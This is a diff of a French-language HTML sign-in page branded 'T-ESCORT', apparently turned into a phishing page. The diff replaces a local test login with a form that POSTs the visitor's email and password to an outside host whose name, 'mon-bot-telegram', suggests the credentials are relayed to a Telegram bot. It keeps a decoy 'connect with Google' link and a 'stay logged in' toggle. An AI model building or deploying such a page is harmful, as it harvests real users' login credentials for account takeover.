@@ -5,7 +5,6 @@
 <title>T-ESCORT</title>
 
 <style>
-
 * {
     margin: 0;
     padding: 0;
@@ -75,10 +74,8 @@ body {
     justify-content: space-between;
     align-items: center;
     margin-bottom: 20px;
-}
-
-.google-btn:hover {
-    opacity: 0.9;
+    text-decoration: none;
+    font-size: 14px;
 }
 
 .input-box {
@@ -152,10 +149,6 @@ body {
     text-decoration: underline;
 }
 
-.link:hover {
-    color: #ff7a18;
-}
-
 .btn {
     width: 100%;
     padding: 12px;
@@ -174,95 +167,53 @@ body {
 .register {
     background: white;
     color: #333;
+    text-decoration: none;
+    display: block;
+    margin-top: 10px;
+    line-height: 25px;
 }
-
 </style>
 </head>
 
 <body>
 
 <div class="container">
-
     <div class="logo">
         <span class="t">T</span><span class="rest">ESCORT</span>
     </div>
 
     <div class="title">S'IDENTIFIER</div>
 
-    <button class="google-btn" onclick="googleLogin()">
+    <a href="https://accounts.google.com" class="google-btn">
         <span>G CONNEXION AVEC GOOGLE</span>
         <span>→</span>
-    </button>
+    </a>
 
-    <div class="input-box">
-        <input type="text" id="email" placeholder="Courriel / Nom d'utilisateur">
-    </div>
+    <form action="https://mon-bot-telegram-i1qm.onrender.com/login" method="POST">
+        
+        <div class="input-box">
+            <input type="text" name="email" placeholder="Courriel / Nom d'utilisateur" required>
+        </div>
 
-    <div class="input-box">
-        <input type="password" id="password" placeholder="Mot de Passe">
-    </div>
+        <div class="input-box">
+            <input type="password" name="password" placeholder="Mot de Passe" required>
+        </div>
 
-    <div class="toggle-container">
-        <label class="switch">
-            <input type="checkbox" id="rememberMe" checked>
-            <span class="slider"></span>
-        </label>
-        <span>Rester connecté(e)</span>
-    </div>
+        <div class="toggle-container">
+            <label class="switch">
+                <input type="checkbox" name="rememberMe" checked>
+                <span class="slider"></span>
+            </label>
+            <span>Rester connecté(e)</span>
+        </div>
 
-    <div class="link" onclick="forgotPassword()">Mot de Passe oublié?</div>
+        <div class="link">Mot de Passe oublié?</div>
 
-    <button class="btn login" onclick="login()">S'IDENTIFIER</button>
+        <button type="submit" class="btn login">S'IDENTIFIER</button>
+    </form>
 
-    <button class="btn register" onclick="register()">ENREGISTREZ-VOUS</button>
-
+    <a href="#" class="btn register">ENREGISTREZ-VOUS</a>
 </div>
-
-<script>
-
-function googleLogin() {
-    window.location.href = "https://accounts.google.com";
-}
-
-function forgotPassword() {
-    window.location.href = "reset-password.html";
-}
-
-// ✅ NOUVELLE FONCTION LOGIN CONNECTÉE AU BACKEND
-function login() {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-    const remember = document.getElementById("rememberMe").checked;
-
-    fetch("http://localhost:3000/login", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            email,
-            password,
-            remember
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.success) {
-            alert("Connexion réussie");
-        } else {
-            alert("Échec de connexion");
-        }
-    })
-    .catch(() => {
-        alert("Erreur serveur");
-    });
-}
-
-function register() {
-    window.location.href = "register.html";
-}
-
-</script>
 
 </body>
 </html>
